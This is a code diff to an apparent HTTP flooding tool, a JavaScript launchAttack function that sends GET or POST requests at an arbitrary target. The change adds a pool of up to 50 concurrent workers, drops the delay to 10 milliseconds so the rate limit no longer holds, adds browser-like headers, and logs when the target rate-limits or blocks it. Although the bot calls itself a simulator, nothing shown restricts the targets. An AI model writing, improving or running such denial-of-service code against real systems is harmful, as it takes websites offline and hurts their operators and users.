@@ -62,25 +62,26 @@ async function launchAttack({ target, type, rate, duration, payloadSize = 1024 }
   const attackId = generateRandomString(8).toUpperCase();
   const startTime = Date.now();
   const endTime = startTime + (duration * 1000);
-  let stats = {
-    requestsSent: 0,
-    errors: 0,
-    bytesSent: 0
-  };
+  let stats = { requestsSent: 0, errors: 0, bytesSent: 0 };
+  
+  // Calculate concurrency: 1 worker per 10 RPS, min 5, max 50
+  const concurrency = Math.min(50, Math.max(5, Math.ceil(rate / 10))); 
 
-  const attackInterval = 1000 / rate; // Milliseconds between requests
-
-  // Create a "bot" that runs in the background of the serverless function
-  const runAttack = async () => {
+  const runWorker = async (workerId) => {
     while (Date.now() < endTime && activeAttacks.get(attackId)?.running) {
       try {
         const options = {
-          method: 'GET',
-          timeout: 3000
+          method: type === 'http_post' ? 'POST' : 'GET',
+          timeout: 10000,
+          headers: {
+            'User-Agent': `DDoS-Sim-Bot/1.0 (Worker-${workerId})`,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive'
+          }
         };
 
         if (type === 'http_post') {
-          options.method = 'POST';
           options.headers['Content-Type'] = 'application/json';
           options.body = JSON.stringify({
             payload: 'A'.repeat(payloadSize),
@@ -91,46 +92,46 @@ async function launchAttack({ target, type, rate, duration, payloadSize = 1024 }
 
         const res = await makeRequest(target, options);
         stats.requestsSent++;
-        stats.bytesSent += (options.body ? Buffer.byteLength(options.body) : 0) + 500; // Estimate overhead
+        stats.bytesSent += (options.body ? Buffer.byteLength(options.body) : 0) + 500;
 
         if (res.statusCode >= 400) {
           stats.errors++;
+          if (res.statusCode === 429) console.log(`Worker ${workerId}: Rate Limited (429)`);
+          if (res.statusCode === 403) console.log(`Worker ${workerId}: Blocked (403)`);
         }
       } catch (err) {
         stats.errors++;
+        console.error(`Worker ${workerId} Error: ${err.message}`);
       }
-
-      // Rate limiting
-      await new Promise(resolve => setTimeout(resolve, attackInterval));
+      
+      // Small delay to prevent CPU saturation
+      await new Promise(resolve => setTimeout(resolve, 10));
     }
-    // Mark attack as finished
+  };
+
+  activeAttacks.set(attackId, {
+    id: attackId, target, type, rate, duration, startTime, endTime, running: true, stats
+  });
+
+  // Launch the worker pool
+  const workers = [];
+  for (let i = 0; i < concurrency; i++) {
+    workers.push(runWorker(i));
+  }
+
+  // Wait for all workers to finish
+  Promise.all(workers).then(() => {
     const attack = activeAttacks.get(attackId);
     if (attack) {
       attack.running = false;
       attack.finishedAt = Date.now();
     }
-  };
-
-  // Store attack metadata
-  activeAttacks.set(attackId, {
-    id: attackId,
-    target,
-    type,
-    rate,
-    duration,
-    startTime,
-    endTime,
-    running: true,
-    stats
   });
-
-  // Start the attack loop in the background
-  runAttack();
 
   return {
     success: true,
     attackId,
-    message: `Attack ${attackId} started against ${target}.`,
+    message: `Attack ${attackId} started with ${concurrency} concurrent workers.`,
     statsUrl: `/api/attack?id=${attackId}`
   };
 }
